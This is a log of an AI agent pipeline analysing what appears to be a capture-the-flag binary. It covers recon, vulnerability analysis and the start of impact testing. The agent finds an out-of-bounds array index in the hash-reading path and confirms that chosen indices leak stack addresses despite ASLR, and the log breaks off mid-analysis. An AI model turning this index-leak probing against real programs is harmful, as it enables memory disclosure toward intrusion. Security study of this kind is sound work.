19:52:52 === Full Run: S1 → S2 → S3（所有 bug） → S4 ===

19:52:52 --- S1 Recon ---
19:52:52 === recon (bug_id=-) ===
19:52:52 [recon] → 调用 GLM...
19:52:57 [recon] ← GLM(4.6s): 调工具[elf_info, checksec, identify_libc, list_strings, sections]
19:52:57 [recon] 我将开始对目标二进制进行系统性侦察。先并行收集基础信息：ELF头、保护机制、libc依赖、字符串、sections。
19:52:57 [recon]   → 工具 elf_info({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"})
19:52:57 [recon]   → 工具 checksec({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"})
19:52:57 [recon]   → 工具 identify_libc({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"})
19:52:57 [recon]   → 工具 list_strings({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "max_lines": 200})
19:52:57 [recon]   → 工具 sections({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"})
19:52:57 [recon]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ __gmon_start__ ⏎ _ITM_deregisterTMCloneTable ⏎ _ITM_registerTMCloneTable ⏎ SHA256_Init ⏎ SHA256_Final ⏎ SHA256_Update ⏎ ...(2357 chars)
19:52:57 [recon]   ← sections(0.0s): There are 31 section headers, starting at offset 0x3a68: ⏎  ⏎ Section Headers: ⏎   [Nr] Name              Type             Address           Offset ⏎ ...(4808 chars)
19:52:57 [recon]   ← elf_info(0.0s): /work/workspace/0030-2024-55-flag-hasher-20260909-195252/target: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpre...(4220 chars)
19:52:57 [recon]   ← identify_libc(0.0s): 	libcrypto.so.3 => /lib/x86_64-linux-gnu/libcrypto.so.3 (0x00007b550d995000) ⏎ 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007b550d783000) ⏎ ==...(169 chars)
19:52:57 [recon]   ← checksec(0.2s): [*] '/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Full RELRO ⏎     Stack:     ...(298 chars)
19:52:57 [recon] → 调用 GLM...
19:53:02 [recon] ← GLM(4.8s): 调工具[symbols, global_vars, got_plt, cfg, disassemble]
19:53:02 [recon] 基础信息已收集。现在并行收集：符号表、全局变量、GOT/PLT、CFG、main反汇编。
19:53:02 [recon]   → 工具 symbols({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "max_lines": 100})
19:53:02 [recon]   → 工具 global_vars({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "max_lines": 60})
19:53:02 [recon]   → 工具 got_plt({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"})
19:53:02 [recon]   → 工具 cfg({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"})
19:53:02 [recon]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "main", "lines": 200})
19:53:02 [recon]   ← global_vars(0.0s):     23: 0000000000004048     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2) ⏎     24: 0000000000004020     8 OBJECT  GLOBAL DEFAULT   26 stdin@G...(1277 chars)
19:53:02 [recon]   ← got_plt(0.0s): [{"offset": "0000000000003d28", "type": "R_X86_64_RELATIVE", "value": "*ABS*+0x0000000000001340"}, {"offset": "0000000000003d30", "type": "R_X86_64_RE...(2678 chars)
19:53:02 [recon]   ← symbols(0.0s):                  U SHA256_Final@OPENSSL_3.0.0 ⏎                  U SHA256_Init@OPENSSL_3.0.0 ⏎                  U SHA256_Update@OPENSSL_3.0.0 ⏎ 000000...(2027 chars)
19:53:02 [recon]   ← disassemble(0.0s): 0000000000001521 <main>: ⏎     1521:	endbr64 ⏎     1525:	push   rbp ⏎     1526:	mov    rbp,rsp ⏎     1529:	sub    rsp,0x4c0 ⏎     1530:	mov    rax,QWO...(6712 chars)
19:53:03 [recon]   ← cfg(1.1s): [{"name": "_init", "addr": "0x401000", "blocks": 3, "calls": ["UnresolvableCallTarget"]}, {"name": "sub_401020", "addr": "0x401020", "blocks": 1, "cal...(4920 chars)
19:53:03 [recon] → 调用 GLM...
19:53:08 [recon] ← GLM(5.2s): 调工具[disassemble, disassemble, disassemble, disassemble, probe_io]
19:53:08 [recon] main反汇编已获取。现在并行反汇编其他关键函数：init、compute_hash256、menu、_abort，并探测I/O行为。
19:53:08 [recon]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "init", "lines": 80})
19:53:08 [recon]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "compute_hash256", "lines": 80})
19:53:08 [recon]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "menu", "lines": 60})
19:53:08 [recon]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "_abort", "lines": 40})
19:53:08 [recon]   → 工具 probe_io({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "steps": "[{\"recv_until\": \">\", \"send\": \"1\"}, {\"recv_until\": \")
19:53:08 [recon]   ← disassemble(0.0s): 00000000000014b2 <init>: ⏎     14b2:	endbr64 ⏎     14b6:	push   rbp ⏎     14b7:	mov    rbp,rsp ⏎     14ba:	mov    rax,QWORD PTR [rip+0x2b5f]        # ...(899 chars)
19:53:08 [recon]   ← disassemble(0.0s): 000000000000137e <compute_hash256>: ⏎     137e:	endbr64 ⏎     1382:	push   rbp ⏎     1383:	mov    rbp,rsp ⏎     1386:	sub    rsp,0xa0 ⏎     138d:	mov ...(1275 chars)
19:53:08 [recon]   ← disassemble(0.0s): 0000000000001420 <menu>: ⏎     1420:	endbr64 ⏎     1424:	push   rbp ⏎     1425:	mov    rbp,rsp ⏎     1428:	lea    rax,[rip+0xbe1]        # 2010 <_IO_s...(1355 chars)
19:53:08 [recon]   ← disassemble(0.0s): 0000000000001349 <_abort>: ⏎     1349:	endbr64 ⏎     134d:	push   rbp ⏎     134e:	mov    rbp,rsp ⏎     1351:	sub    rsp,0x10 ⏎     1355:	mov    QWORD ...(466 chars)
19:53:08 [recon]   ← probe_io(0.2s): PROBE_ERROR: EOFError:
19:53:08 [recon] → 调用 GLM...
19:53:15 [recon] ← GLM(6.8s): 调工具[read_file, execute, execute]
19:53:15 [recon] probe_io因EOFError失败（可能需要FLAG环境变量）。让我检查rodata字符串和尝试用FLAG环境变量运行。
19:53:15 [recon]   → 工具 read_file({"file_path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "limit": 1, "offset": 0})
19:53:15 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && readelf -x .rodata target 2>/dev/null | head -60"})
19:53:15 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && readelf -d target | grep -iE 'path|needed|rpath|runpath'"})
19:53:15 [recon]   ← read_file(0.0s): Error: Error reading file '/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target': 'utf-8' codec can't decode byte 0xd8 in position 96: inva...(171 chars)
19:53:15 [recon]   ← execute(0.0s):  ⏎ Hex dump of section '.rodata': ⏎   0x00002000 01000200 00000000 25730000 00000000 ........%s...... ⏎   0x00002010 20202020 20205f20 20202020 202020...(2315 chars)
19:53:15 [recon]   ← execute(0.0s):  0x0000000000000001 (NEEDED)             Shared library: [libcrypto.so.3] ⏎  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6] ⏎  ⏎ ...(186 chars)
19:53:15 [recon] → 调用 GLM...
19:53:21 [recon] ← GLM(6.4s): 调工具[probe_io, execute]
19:53:21 [recon] 关键发现：程序需要FLAG环境变量，且scanf格式串是`%u`（无符号）。让我用FLAG环境变量探测I/O，并确认scanf格式串。
19:53:21 [recon]   → 工具 probe_io({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "steps": "[{\"recv_until\": \">\", \"send\": \"1\"}, {\"recv_until\": \")
19:53:21 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && FLAG=testflag123 ./target <<'EOF'\n1\nAAAA\n2\n0\n2\n5\n9\nEOF"})
19:53:22 [recon]   ← execute(0.0s): can't find the flag! ⏎  ⏎ Exit code: 1 ⏎ [Command failed with exit code 1]
19:53:22 [recon]   ← probe_io(0.1s): PROBE_ERROR: EOFError:
19:53:22 [recon] → 调用 GLM...
19:53:26 [recon] ← GLM(3.9s): 调工具[execute]
19:53:26 [recon] FLAG环境变量名不是"FLAG"。让我检查rodata中的"flag"字符串引用——main在0x1549引用`[rip+0xbfc]`即0x214c，对应"flag"。让我用不同大小写尝试。
19:53:26 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && for v in flag Flag FLAG test; do echo \"=== trying $v ===\"; env $v=testfl)
19:53:26 [recon]   ← execute(0.0s): === trying flag === ⏎       _           ___  _____   __   ⏎      | |         |__ \| ____| / /   ⏎   ___| |__   __ _   ) | |__  / /_   ⏎ === trying Fla...(310 chars)
19:53:26 [recon] → 调用 GLM...
19:53:29 [recon] ← GLM(3.7s): 调工具[execute]
19:53:29 [recon] 环境变量名是小写"flag"。现在用正确的环境变量探测I/O行为。
19:53:29 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && flag=testflag123 timeout 3 ./target <<'EOF'\n1\nAAAA\n2\n0\n2\n5\n9\nEOF"})
19:53:29 [recon]   ← execute(0.0s):       _           ___  _____   __   ⏎      | |         |__ \| ____| / /   ⏎   ___| |__   __ _   ) | |__  / /_   ⏎  / __| '_ \ / _` | / /|___ \| '_ \  ...(804 chars)
19:53:29 [recon] → 调用 GLM...
19:53:35 [recon] ← GLM(5.7s): 调工具[execute]
19:53:35 [recon] 重要发现：菜单只接受1和2，输入9会触发"Unknown command"并exit。注意Hash存储在索引1（不是0）。让我验证索引边界行为——Read Hash record用scanf `%u`读取索引，且main中索引0存的是flag的hash。让我测试负数/大索引。
19:53:35 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && echo \"=== Read idx 0 (flag hash) ===\" && flag=testflag123 timeout 3 ./ta)
19:53:35 [recon]   ← execute(0.0s): === Read idx 0 (flag hash) === ⏎       _           ___  _____   __   ⏎      | |         |__ \| ____| / /   ⏎   ___| |__   __ _   ) | |__  / /_   ⏎  / ...(1928 chars)
19:53:35 [recon] → 调用 GLM...
19:53:42 [recon] ← GLM(6.5s): 调工具[execute]
19:53:42 [recon] 关键发现： 1. idx 0 = flag的hash（存在） 2. idx -1 = scanf `%u`读取负数，scanf返回0（无匹配），idx保持0，所以打印了idx 0的hash 3. idx 16 = "Entry does not exist"（NULL检查生效） 4. idx 429
19:53:42 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && echo \"=== idx 15 (last valid slot) ===\" && flag=testflag123 timeout 3 ./)
19:53:42 [recon]   ← execute(0.0s): === idx 15 (last valid slot) === ⏎       _           ___  _____   __   ⏎      | |         |__ \| ____| / /   ⏎   ___| |__   __ _   ) | |__  / /_   ⏎  ...(1494 chars)
19:53:42 [recon] → 调用 GLM...
19:53:48 [recon] ← GLM(5.9s): 调工具[execute]
19:53:48 [recon] 有趣：idx 15-100都返回"Entry does not exist"（NULL检查），但idx 0xffffffff崩溃。这说明当索引值很大时，`[rbp+rax*8-0x490]`访问的地址超出栈范围导致Bus error。让我确认compute_hash256存储逻辑——main中com
19:53:48 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && echo \"=== compute then read idx 1 ===\" && flag=testflag123 timeout 3 ./t)
19:53:48 [recon]   ← execute(0.0s): === compute then read idx 1 === ⏎       _           ___  _____   __   ⏎      | |         |__ \| ____| / /   ⏎   ___| |__   __ _   ) | |__  / /_   ⏎  /...(1631 chars)
19:53:48 [recon] → 调用 GLM...
19:53:54 [recon] ← GLM(6.3s): 调工具[execute]
19:53:54 [recon] 确认：Compute存到idx 1（第一个空槽，idx 0是flag hash）。现在让我确认scanf格式串地址——main在0x17c9引用`[rip+0xa0d]`即0x21dd，对应`%u`。让我验证这个地址。
19:53:54 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && python3 -c \"\n# rodata at 0x2000, file offset 0x2000\n# 0x21dd - 0x2000 =)
19:53:54 [recon]   ← execute(0.0s): 0x21dd: b'%u\x00Entry' ⏎ 0x2167: b'%d\x00\x00\x00\x00\x00\x00' ⏎ 0x214c: b'flag\x00can' ⏎  ⏎ [Command succeeded with exit code 0]
19:53:54 [recon] → 调用 GLM...
19:53:58 [recon] ← GLM(4.5s): 调工具[execute]
19:53:58 [recon] 确认： - 0x21dd = `%u`（Read Hash record的scanf格式串，无符号整数） - 0x2167 = `%d`（菜单选择的scanf格式串，有符号整数） - 0x214c = `flag`（getenv参数）  现在让我确认libc版本和检查是否有RPATH/RUNPATH
19:53:58 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && echo \"=== libc version ===\" && /lib/x86_64-linux-gnu/libc.so.6 2>&1 | he)
19:53:58 [recon]   ← execute(0.1s): === libc version === ⏎ GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.8) stable release version 2.39. ⏎ Copyright (C) 2024 Free Software Foundation, Inc. ⏎...(635 chars)
19:53:58 [recon] → 调用 GLM...
19:54:13 [recon] ← GLM(14.4s): 调工具[execute]
19:54:13 [recon] 所有信息已收集完毕。现在让我整理关键发现并构建最终报告。  关键事实总结： 1. **二进制**：x86-64 PIE，动态链接，not stripped，GCC 11.4.0 2. **保护**：Full RELRO, NX, Canary, PIE, SHSTK+IBT (CET) 3. **运
19:54:13 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && python3 -c \"\n# main stack frame analysis\n# sub rsp, 0x4c0\n# rbp-0x490 )
19:54:13 [recon]   ← execute(0.0s): Hash array base: rbp-0x490 ⏎ Hash array end (idx 16): rbp-0x410 = text buffer start ⏎ Text buffer: rbp-0x410, size 0x400 ⏎ Text buffer end: rbp-0x10 ⏎...(600 chars)
19:54:13 [recon] → 调用 GLM...
19:54:16 [recon] ← GLM(3.4s): 调工具[execute]
19:54:16 [recon] 重要推导：idx 0x92(146)命中saved rbp，idx 0x93(147)命中返回地址。让我验证这些索引是否崩溃或返回数据。
19:54:16 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && echo \"=== idx 146 (saved rbp) ===\" && flag=testflag123 timeout 3 ./targe)
19:54:16 [recon]   ← execute(0.0s): === idx 146 (saved rbp) === ⏎       _           ___  _____   __   ⏎      | |         |__ \| ____| / /   ⏎   ___| |__   __ _   ) | |__  / /_   ⏎  / __|...(2303 chars)
19:54:16 [recon] → 调用 GLM...
19:54:26 [recon] ← GLM(10.0s): 调工具[execute]
19:54:26 [recon] 重大发现确认！idx 146/147/148都能成功读取栈数据（不崩溃），返回了32字节的栈内容。idx 147的返回地址`89C7E8CFD90100`看起来像PIE base+offset。让我解析这些泄漏的值。
19:54:26 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && python3 -c \"\nimport struct\n# idx 146: 90861B93FC7F0000 8B52EBA093790000)
19:54:26 [recon]   ← execute(0.0s): idx 146 values: ['0x7ffc931b8690', '0x7993a0eb528b', '0x7ffc931b86c8', '0x5a408f74fd30'] ⏎ idx 147 values: ['0xe80001d9cfe8c789', '0xf22d83f00006f19a'...(439 chars)
19:54:26 [recon] → 调用 GLM...
19:54:36 [recon] ← GLM(10.1s): 调工具[execute]
19:54:36 [recon] idx 146确认泄漏了栈地址（0x7ffc...）。idx 147的数据看起来不对——可能因为idx 147命中的不是返回地址而是其他位置。让我重新计算：main的栈帧是0x4c0，hash数组在rbp-0x490。idx N访问rbp-0x490+N*8。idx 146 = rbp-0x490+
19:54:36 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && echo \"=== run twice to check ASLR ===\" && for i in 1 2; do echo \"--- ru)
19:54:36 [recon]   ← execute(0.0s): === run twice to check ASLR === ⏎ Idx: Hash - 146 : 30C66390FD7F00008B222ABF1674000068C66390FD7F0000305DA360C7630000 ⏎ Idx: Hash - 146 : E064114EFD7F0...(243 chars)
19:54:36 [recon] → 调用 GLM...
19:54:44 [recon] ← GLM(8.0s): 调工具[execute]
19:54:44 [recon] 确认：两次运行泄漏的栈地址不同（0x7ffd9063c630 vs 0x7ffd4e1164e0），证明ASLR开启且idx 146泄漏的是运行时栈地址。  现在我已经收集了所有必要的事实。让我构建最终的S1侦察报告。
19:54:45 [recon]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && python3 -c \"\n# Verify the exact stack layout offsets from disassembly\n#)
19:54:45 [recon]   ← execute(0.0s): Stack layout verified ⏎ Array base: rbp-0x490, 16 entries (idx 0-15) ⏎ idx 16-145: overlaps text buffer (rbp-0x410 to rbp-0x10) ⏎ idx 146: saved rbp (...(290 chars)
19:54:45 [recon] → 调用 GLM...
19:55:56 [recon] ← GLM(71.9s): 调工具[submit_final_result]
19:55:56 [recon] 所有侦察完成。现在提交最终报告。
19:55:56 [recon] ✓ submit_final_result 收到最终报告（ReconReport 校验通过，13225 chars）
19:55:56 [recon] → 调用 GLM...
19:56:03 [recon] ← GLM(6.3s)
19:56:03 [recon] S1 侦察已完成并提交。以下是关键发现摘要：  ## 侦察结果摘要  **二进制**：x86-64 PIE，动态链接，未strip，GCC 11.4.0  **保护机制**：Full RELRO + NX + Canary + PIE + CET(SHSTK/IBT) 全开  **运行环境**：gl
19:56:03 [stage1] 保存 → /work/workspace/0030-2024-55-flag-hasher-20260909-195252/stage1.json
19:56:03 --- S2 Semantic ---
19:56:03 === semantic (bug_id=-) ===
19:56:03 [semantic] → 调用 GLM...
19:56:06 [semantic] ← GLM(3.1s): 调工具[disassemble, disassemble]
19:56:06 [semantic] I'll analyze the binary's disassembly to verify the S1 facts and establish the root cause of the vulnerability. Let me start by examining the key func
19:56:06 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "main", "lines": 200})
19:56:06 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "compute_hash256", "lines": 100})
19:56:06 [semantic]   ← disassemble(0.0s): 0000000000001521 <main>: ⏎     1521:	endbr64 ⏎     1525:	push   rbp ⏎     1526:	mov    rbp,rsp ⏎     1529:	sub    rsp,0x4c0 ⏎     1530:	mov    rax,QWO...(6712 chars)
19:56:06 [semantic]   ← disassemble(0.0s): 000000000000137e <compute_hash256>: ⏎     137e:	endbr64 ⏎     1382:	push   rbp ⏎     1383:	mov    rbp,rsp ⏎     1386:	sub    rsp,0xa0 ⏎     138d:	mov ...(1275 chars)
19:56:06 [semantic] → 调用 GLM...
19:56:10 [semantic] ← GLM(3.8s): 调工具[disassemble, disassemble]
19:56:10 [semantic] Now I have the full disassembly. Let me verify the key vulnerability points by examining the read path more carefully. The critical section is at 0x17
19:56:10 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "_abort", "lines": 30})
19:56:10 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "init", "lines": 30})
19:56:10 [semantic]   ← disassemble(0.0s): 00000000000014b2 <init>: ⏎     14b2:	endbr64 ⏎     14b6:	push   rbp ⏎     14b7:	mov    rbp,rsp ⏎     14ba:	mov    rax,QWORD PTR [rip+0x2b5f]        # ...(899 chars)
19:56:10 [semantic]   ← disassemble(0.0s): 0000000000001349 <_abort>: ⏎     1349:	endbr64 ⏎     134d:	push   rbp ⏎     134e:	mov    rbp,rsp ⏎     1351:	sub    rsp,0x10 ⏎     1355:	mov    QWORD ...(466 chars)
19:56:10 [semantic] → 调用 GLM...
19:56:13 [semantic] ← GLM(2.9s): 调工具[list_strings]
19:56:13 [semantic] Now let me verify the exact stack layout and the OOB index calculation. Let me also check the strings to understand the format strings used.
19:56:13 [semantic]   → 工具 list_strings({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "max_lines": 60})
19:56:13 [semantic]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ __gmon_start__ ⏎ _ITM_deregisterTMCloneTable ⏎ _ITM_registerTMCloneTable ⏎ SHA256_Init ⏎ SHA256_Final ⏎ SHA256_Update ⏎ ...(1101 chars)
19:56:13 [semantic] → 调用 GLM...
19:56:33 [semantic] ← GLM(20.5s): 调工具[read_file]
19:56:33 [semantic] Now I have all the facts I need. Let me verify the critical OOB read path analysis by examining the exact instructions at the read path.  The key vuln
19:56:33 [semantic]   → 工具 read_file({"file_path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "limit": 1, "offset": 0})
19:56:33 [semantic]   ← read_file(0.0s): Error: Error reading file '/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target': 'utf-8' codec can't decode byte 0xd8 in position 96: inva...(171 chars)
19:56:33 [semantic] → 调用 GLM...
19:56:36 [semantic] ← GLM(2.6s): 调工具[execute, execute]
19:56:36 [semantic]   → 工具 execute({"command": "xxd -s 0x21dd -l 16 /work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"})
19:56:36 [semantic]   → 工具 execute({"command": "xxd -s 0x2167 -l 16 /work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"})
19:56:36 [semantic]   ← execute(0.0s): 000021dd: 2575 0045 6e74 7279 2064 6f65 7320 6e6f  %u.Entry does no ⏎  ⏎ [Command succeeded with exit code 0]
19:56:36 [semantic]   ← execute(0.0s): 00002167: 2564 0000 0000 0000 004f 5554 2d4f 462d  %d.......OUT-OF- ⏎  ⏎ [Command succeeded with exit code 0]
19:56:36 [semantic] → 调用 GLM...
19:58:09 [semantic] ← GLM(93.3s): 调工具[submit_final_result]
19:58:09 [semantic] Confirmed: `0x21dd` = `%u` (unsigned int for read_idx), `0x2167` = `%d` (signed int for menu_choice).  Now let me verify the exact stack frame layout 
19:58:09 [semantic] ✓ submit_final_result 收到最终报告（VulnerabilityReport 校验通过，16674 chars）
19:58:09 [semantic] → 调用 GLM...
19:58:15 [semantic] ← GLM(6.1s)
19:58:15 [semantic] S2 语义漏洞分析已完成并提交。报告包含两个漏洞：  **BUG-001 (HIGH)** — `OOB_ARRAY_INDEX_MISSING_BOUNDS_CHECK`：main 函数的 "Read Hash record" 路径中，`scanf("%u")` 读取的索引直接用于访问 `hash
19:58:15 [stage2] 保存 → /work/workspace/0030-2024-55-flag-hasher-20260909-195252/stage2.json
19:58:15 --- S3 Primitive（所有 bug） ---
19:58:15 === impact (bug_id=BUG-001) ===
19:58:15 [impact:BUG-001] → 调用 GLM...
19:58:19 [impact:BUG-001] ← GLM(4.1s): 调工具[disassemble, probe_io]
19:58:19 [impact:BUG-001] 我将分析 BUG-001（在读取哈希记录路径中缺少边界检查的 OOB 数组索引）。让我先从理解二进制布局和漏洞机制开始。
19:58:19 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "main", "lines": 200})
19:58:19 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "steps": "[{\"recv_until\": \"2\", \"send\": \"2\"}, {\"recv_until\": \")
19:58:19 [impact:BUG-001]   ← disassemble(0.0s): 0000000000001521 <main>: ⏎     1521:	endbr64 ⏎     1525:	push   rbp ⏎     1526:	mov    rbp,rsp ⏎     1529:	sub    rsp,0x4c0 ⏎     1530:	mov    rax,QWO...(6712 chars)
19:58:20 [impact:BUG-001]   ← probe_io(0.2s): PROBE_ERROR: EOFError:
19:58:20 [impact:BUG-001] → 调用 GLM...
19:58:26 [impact:BUG-001] ← GLM(7.0s): 调工具[probe_io, gdb_run]
19:58:26 [impact:BUG-001] 让我更仔细地探测一下 I/O，并检查栈布局：
19:58:26 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "input": "2\n0\n", "max_lines": 60})
19:58:26 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "b *main+0x2c4; run; info registers rbp rsp; x/4gx $rbp; x/4)
19:58:27 [impact:BUG-001]   ← probe_io(0.0s): 00000000: 6361 6e27 7420 6669 6e64 2074 6865 2066  can't find the f ⏎ 00000010: 6c61 6721 0a                             lag!. ⏎ 
19:58:27 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x17e5 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(530 chars)
19:58:27 [impact:BUG-001] → 调用 GLM...
19:58:30 [impact:BUG-001] ← GLM(3.2s): 调工具[execute]
19:58:30 [impact:BUG-001] 该二进制文件需要设置 `flag` 环境变量。让我用该环境变量重试：
19:58:30 [impact:BUG-001]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && echo \"testflag\" | flag=testflag ./target 2>&1 | head -20"})
19:58:30 [impact:BUG-001]   ← execute(0.0s):       _           ___  _____   __   ⏎      | |         |__ \| ____| / /   ⏎   ___| |__   __ _   ) | |__  / /_   ⏎  / __| '_ \ / _` | / /|___ \| '_ \  ...(368 chars)
19:58:30 [impact:BUG-001] → 调用 GLM...
19:58:33 [impact:BUG-001] ← GLM(3.0s): 调工具[probe_io]
19:58:33 [impact:BUG-001] 好的，需要设置环境变量。让我用正确的环境变量进行探测：
19:58:33 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "max_lines": 60, "steps": "[{\"recv_until\": \"2 - Read Hash record\", \)
19:58:33 [impact:BUG-001]   ← probe_io(0.1s): PROBE_ERROR: EOFError:
19:58:33 [impact:BUG-001] → 调用 GLM...
19:58:36 [impact:BUG-001] ← GLM(3.5s): 调工具[gdb_run]
19:58:36 [impact:BUG-001] probe_io 工具不直接支持环境变量。让我使用带有环境变量的 gdb_run：
19:58:37 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x2c4; run; info reg)
19:58:37 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x17e5 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(957 chars)
19:58:37 [impact:BUG-001] → 调用 GLM...
19:58:47 [impact:BUG-001] ← GLM(10.6s): 调工具[gdb_run]
19:58:47 [impact:BUG-001] 太棒了！现在我已经获取了栈布局。让我来分析一下关键偏移量：  - `rbp = 0x7fffffffeaa0` - `hash_array` 基址 = `rbp - 0x490 = 0x7fffffffe610` - `idx 0` = `0x7fffffffe610` → `0x000055555
19:58:47 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x2c4; run; printf \)
19:58:47 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x17e5 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1040 chars)
19:58:47 [impact:BUG-001] → 调用 GLM...
19:58:55 [impact:BUG-001] ← GLM(7.7s): 调工具[gdb_run]
19:58:55 [impact:BUG-001] 现在我已经掌握了完整的栈布局。让我来分析一下关键索引：  - **idx 145** (canary): `0xc4726ef83089ae00` - 非空，随机值 → 将被解引用为指针（很可能导致崩溃） - **idx 146** (saved rbp): `0x7fffffffeb40` - 栈
19:58:55 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x2c4; run; printf \)
19:58:55 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x17e5 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1648 chars)
19:58:55 [impact:BUG-001] → 调用 GLM...
19:59:00 [impact:BUG-001] ← GLM(5.2s): 调工具[gdb_run]
19:59:00 [impact:BUG-001] 这非常有参考价值。现在让我来理解一下实际的输出行为。当程序读取索引 146 时，它会： 1. 从 `rbp` 加载 8 字节值 → `0x7fffffffeb40`（一个栈地址） 2. 将其解引用并打印 32 字节  打印的 32 字节将包含栈内容（更多栈地址）。让我验证一下实际的程序输出，以确认信
19:59:00 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x2c4; run; printf \)
19:59:00 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x17e5 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1154 chars)
19:59:00 [impact:BUG-001] → 调用 GLM...
19:59:08 [impact:BUG-001] ← GLM(7.9s): 调工具[gdb_run]
